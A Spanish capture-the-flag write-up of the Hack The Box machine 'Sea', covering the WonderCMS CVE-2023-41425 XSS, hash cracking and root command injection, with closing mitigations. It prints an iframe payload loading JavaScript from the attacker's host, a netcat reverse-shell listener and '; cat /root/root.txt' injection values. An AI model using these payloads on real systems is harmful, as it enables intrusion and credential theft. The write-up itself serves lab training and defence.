---
machine: Sea
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, wondercms, cve-2023-41425, xss, rce, command-injection, hash-cracking]
---

# Sea — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Sólo 22 y 80. El sitio es **WonderCMS**, vulnerable a CVE-2023-41425: un XSS en la instalación de temas permite apuntar a un módulo malicioso y ejecutar código. Con `www-data` se encuentra un hash en la base de datos, se crackea y da acceso a `amay`. Un servicio web interno en **8080** (autenticado con esas credenciales) tiene inyección de comandos y corre como root.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.41
```

```bash
whatweb http://<IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Estructura típica de WonderCMS en la raíz: `data/`, `plugins/`, `themes/`. El panel de administración está en `/loginURL` (o en el parámetro `?page=loginURL`), y la versión se deduce leyendo `data/database.js` o comparando los ficheros del tema.

```bash
curl -s http://<IP>/ | grep -i -E 'wondercms|generator'
```

## Enumeración

- `whatweb`/Wappalyzer identifican el CMS por la estructura `data/`, `themes/` y `plugins/`; el generador no siempre aparece, así que se confirma leyendo `data/database.js`.
- La versión sale del propio tema: `curl http://<IP>/themes/bike/version` devuelve `3.2.0`, dentro del rango de **CVE-2023-41425** (3.2.0 – 3.4.2).
- El panel está en `/loginURL` y también como `?page=loginURL`; ahí se envía el enlace que dispara el XSS contra el administrador.
- `data/database.js` es un fichero JSON, no una base de datos: contiene el hash del administrador del CMS.

## Foothold

**CVE-2023-41425** — XSS en `installModule` / `loginURL` que permite cargar un ZIP de tema/módulo bajo nuestro control:

1. Alojar el ZIP malicioso (`xss.js` + `theme` con `index.php` que ejecuta un comando).
2. Enviar la víctima a la URL con el parámetro vulnerable:

```bash
http://sea.htb/loginURL?xss=<iframe src="http://<tun0>/xss.js"></iframe>
```

3. El JS descarga e instala el tema; al visitarlo se ejecuta el payload y llega la shell.

```bash
rlwrap nc -lvnp 4444
# www-data@sea
```

Si el módulo no ejecuta directamente, la vía equivalente es inyectar un `php` en un tema ya instalado y pedir la ruta del tema.

Con shell, se revisa la base de datos de WonderCMS y los usuarios del sistema:

```bash
cat /var/www/html/data/database.js
cat /etc/passwd | grep sh$
```

El hash encontrado (bcrypt) se crackea:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
ssh amay@<IP>
```

## Movimiento lateral

`www-data` no es el usuario final: en `data/database.js` está el hash **bcrypt** del administrador del CMS, que se crackea (`-m 3200`) y resulta ser también la contraseña SSH de `amay`. Ese salto es el movimiento lateral del reto; después, `amay` abre el 8080 con las mismas credenciales.

## Escalada de privilegios

`amay` no tiene sudo directo, pero hay un servicio web escuchando sólo en local:

```bash
ss -tlnp
# 127.0.0.1:8080
```

Se reenvía el puerto y se entra con las mismas credenciales:

```bash
ssh -L 8080:127.0.0.1:8080 amay@<IP>
```

El panel es un «System Monitor» en desarrollo con un formulario de **análisis de logs** (`log_file=`) que pasa la ruta a una shell sin sanear, y corre como root. Un payload con separador de comandos devuelve ejecución como root:

```text
; id
; cat /root/root.txt
```

Si la conexión inversa se corta, encadenar `sleep` y lanzar el comando en segundo plano, o crear un usuario con `sudo` desde el propio panel.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- El XSS de WonderCMS exige que el navegador de la víctima cargue el JS; sin *admin* activo, usar la ejecución directa del módulo.
- El hash es bcrypt: `-m 3200`, no `-m 0`.
- El puerto 8080 no se ve desde fuera; hay que hacer el túnel SSH.
- Las comillas en el payload se rompen con el formulario: codificar en URL.

- Un CMS con gestor de temas que instala ZIP sin validar es RCE en cuanto hay una víctima con sesión.
- Contraseñas reutilizadas entre CMS y SSH convierten un hash en acceso al sistema.
- Un servicio interno sin autenticación robusta e inyección de comandos ejecutado como root es el fallo final.
- Mitigación: validar paquetes de temas, ejecutar servicios internos con usuario dedicado y nunca con root.

## Mitigaciones y detección

- Actualizar WonderCMS fuera del rango 3.2.0 – 3.4.2 y no permitir instalar módulos desde URLs arbitrarias (allowlist de origen).
- Servir el CMS con un usuario dedicado y `open_basedir`; que `data/` no sea escribible por el proceso web.
- El monitor interno debe correr como usuario sin privilegios y validar `log_file` contra una lista de rutas permitidas, nunca concatenarlo en una shell.
- Contraseñas distintas por servicio: el hash del CMS no debe abrir SSH.
- Detección: peticiones a `installModule`/`loginURL` con parámetros, y procesos web lanzando comandos (`sh -c`) desde un servicio de monitorización.

## Referencias

- [CVE-2023-41425](https://nvd.nist.gov/vuln/detail/CVE-2023-41425)
